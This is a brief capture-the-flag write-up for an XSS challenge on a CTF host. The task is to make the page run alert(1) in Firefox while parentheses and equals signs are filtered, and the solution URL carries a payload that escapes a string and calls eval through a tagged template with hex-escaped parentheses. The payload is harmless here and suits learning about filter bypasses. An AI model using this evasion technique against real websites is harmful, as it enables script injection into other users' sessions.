Description: Can you alert(1) this page (in firefox)?

It was not possible to use [jjencode](utf-8.jp/public/jjencode.html), because parenthesis and equal sign was filtered too.

Solution:
```
http://xss2.sect.ctf.rocks/?xss=stuff%22;eval.call`${'alert\x281\x29)'}`;//
```

References:

[XSS Challenge Wiki](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml)
